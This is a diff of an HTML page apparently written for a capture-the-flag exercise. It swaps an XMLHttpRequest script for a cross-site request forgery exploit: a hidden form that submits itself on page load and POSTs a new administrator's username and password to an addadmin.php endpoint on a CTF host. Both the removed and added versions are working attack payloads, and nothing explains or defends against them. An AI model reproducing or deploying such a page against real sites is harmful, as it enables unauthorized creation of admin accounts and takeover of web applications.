@@ -1,42 +1,14 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>XMLHttpRequest Example</title>
-  </head>
   <body>
-    <h1>XMLHttpRequest Example</h1>
+    <h1>helloo</h1>
+    <form action="https://skrctf.me/ports/71f83c1974401a61aaf9a0f481574374/addadmin.php" method="POST">
+      <input type="hidden" name='username' value='amir' />
+      <input type="hidden" name='password' value='amir' />
+      <input type="submit" value="Submit request" />
+    </form>
     <script>
-      // Place your XMLHttpRequest code here
-      var xhr = new XMLHttpRequest();
-      var url = "https://skrctf.me/ports/349a89b295bb69a205540ee8001371c1/addadmin.php";
-      var username = "ali";
-      var password = "1234";
-      
-      xhr.open("POST", url, true);
-      
-      // Set the request header for sending form data
-      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-      
-      xhr.onreadystatechange = function () {
-        if (xhr.readyState === 4) {
-          if (xhr.status === 200) {
-            // Request was successful, and you can handle the response here
-            console.log("User added successfully!");
-          } else {
-            // Handle errors or other status codes here
-            console.error("Error: " + xhr.status);
-          }
-        }
-      };
-
-      // Create the data to send
-      var data = "username=" + username + "&password=" + password;
-      
-      xhr.send(data);
-
-      
-      // ... (rest of the code)
+      document.forms[0].submit();
     </script>
   </body>
 </html>
-
